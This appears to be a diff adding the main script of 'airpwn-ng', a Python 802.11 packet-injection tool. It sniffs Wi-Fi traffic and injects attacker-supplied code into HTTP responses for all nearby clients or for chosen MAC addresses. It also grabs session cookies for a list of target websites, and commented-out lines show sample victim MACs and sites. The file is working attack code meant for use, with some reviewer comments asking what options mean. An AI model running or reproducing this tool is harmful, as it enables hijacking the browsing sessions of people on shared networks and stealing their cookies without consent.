@@ -1,0 +1,155 @@
+#! /usr/bin/env python
+
+from threading import Thread
+from Queue import Queue, Empty
+from scapy.all import *
+import subprocess,os,sys,argparse,signal
+import lib.airpwn_ng as AIRPWN_NG
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
+#vp2=AIRPWN_NG.VictimParameters(websites=["http://www.ebay.com"])
+#vp=AIRPWN_NG.VictimParameters(websites=["http://www.torrentleech.org"],inject_file="example-injects/wargames")
+#v1=AIRPWN_NG.Victim(mac="5c:f8:a1:f7:35:f0",victim_parameters=vp)
+#v2=AIRPWN_NG.Victim(mac="C8:B5:B7:26:CD:89",victim_parameters=vp2)
+#v1=AIRPWN_NG.Victim(mac="5c:f8:a1:f7:35:f0",victim_parameters=vp)
+#victims.append(v1)
+#victims.append(v2)
+##ph=AIRPWN_NG.PacketHandler(i="wlan3",victims=victims)
+#ph=AIRPWN_NG.PacketHandler(i="wlan3",victim_parameters=vp)
+#snif=AIRPWN_NG.Sniffer(ph,m="tap0",filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
+#snif.threaded_sniff()
+
+def load_websites_targeted(websites_file):
+	websites=[]
+	f = open(websites_file,'r')
+	for line in f.readlines():
+		if (line.strip()[0]!="#"):
+			websites.append(line.strip())
+	f.close()
+	return websites
+
+
+def main(args):
+	#TODO:	CHECK DEPENDENCIES
+	print "\n\nairpwn-ng - the new and improved 802.11 packet injector\n\n"
+
+	m_iface = args.m
+	i_iface = args.i
+
+	#CHECK FOR EXCLUDED HOSTS
+	if (args.exclude_hosts is not None):
+		EXCLUSION=1
+		EXCLUDE_LIST=args.exclude_hosts
+		
+	injection=0
+	#USE INJECT FILE
+	if (args.injection is not None):
+		print bcolors.OKGREEN+"[+] Loaded injection file",args.injection+bcolors.ENDC
+		injection=1
+	#USE WEBSITE LIST AND CREATE INJECTIONS ON THE FLY
+	#### Create what on the fly?  Do we have a template for the base?  i.e....
+	#### Is there an iframe template, etc...
+	else:
+		injection=0
+		websites=load_websites_targeted(args.websites)
+		for website in websites:
+			print bcolors.OKGREEN+"[+] Loaded target website ",website+bcolors.ENDC
+
+	# BROADCAST MODE
+	#### Nests suck, no way to "case???"
+	if (args.t is None):
+		print bcolors.WARNING+"[!] You are starting your attack in broadcast mode. This means you will inject packets into all clients you are able to detect. Use with caution."+bcolors.ENDC
+		if (injection==0):
+			vp=AIRPWN_NG.VictimParameters(websites=websites)
+			ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
+			if ("mon" in m_iface):
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
+			else:
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
+				snif.threaded_sniff()
+		else:
+			vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
+			ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
+			if ("mon" in m_iface):
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
+				snif.threaded_sniff()
+			else:
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
+				snif.threaded_sniff()
+	# TARGETED MODE
+	else:
+		if (len(args.t)==0):
+			print bcolors.WARNING+"[!] You must specify at least one target MAC address with -t for targeted mode"
+			exit(1)
+		else:
+			for target in args.t:
+				print bcolors.OKGREEN+"[+] Adding target",target+bcolors.ENDC
+
+		if (injection==0):
+			victims=[]
+			vp=AIRPWN_NG.VictimParameters(websites=websites)
+			for victim in args.t:
+				v1=AIRPWN_NG.Victim(mac=victim,victim_parameters=vp)
+				victims.append(v1)
+			ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims)
+			if ("mon" in m_iface):
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
+			else:
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
+			snif.threaded_sniff()			
+		else:
+			victims=[]
+			vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
+			for victim in args.t:
+				v1=AIRPWN_NG.Victim(mac=victim,victim_parameters=vp)
+				victims.append(v1)
+			ph=AIRPWN_NG.PacketHandler(i=i_iface,victims=victims)
+			if ("mon" in m_iface):
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
+			else:
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
+			snif.threaded_sniff()
+
+
+#### I forget what this is called, but what the hell does it mean?
+if __name__ == '__main__':
+
+
+        #ARGUMENT PARSING
+        parser = argparse.ArgumentParser(description='airpwn-ng - the new and improved 802.11 packet injector')
+
+        group = parser.add_mutually_exclusive_group(required=True)
+        group.add_argument('--injection',metavar='<filename>',help='File with your injection code')
+        group.add_argument('--websites',metavar='<filename>',help='List of websites to sniff cookies from')
+
+        parser.add_argument('-m',metavar='<interface>',required=True,help='Your monitor interface')
+        parser.add_argument('-i',metavar='<interface>',required=True,help='Your injection interface')
+
+        parser.add_argument('-t',nargs='*',metavar='<MAC address>',help='Target MAC addresses')
+
+        #### An example list of how to be done would be helpful here:
+        #### 127.0.0.1, 192.168.0.0/24, 192.168.1.100-200, 192-197.123.123.0/24, etc...
+        parser.add_argument('--exclude-hosts',nargs='*',metavar='<host>',help='List of hosts to exclude from injection')
+
+        parser.add_argument('-o',metavar='<outfile>',help='Output File')
+
+        #### Number of cookies...  So like if the browser has 5 cookies for a domain, and you specify 4, then it only grabs 4?
+        #### If true to above, then only the first four?  Random four, etc...
+        #### Description needed
+        parser.add_argument('-c',metavar='<count>',help='Number of cookies to grab per website on the --websites list')
+
+        #### Describe covert...
+        parser.add_argument('--covert',action='store_true',help='Uses less packets')
+        args = parser.parse_args()
+        main(args)
+
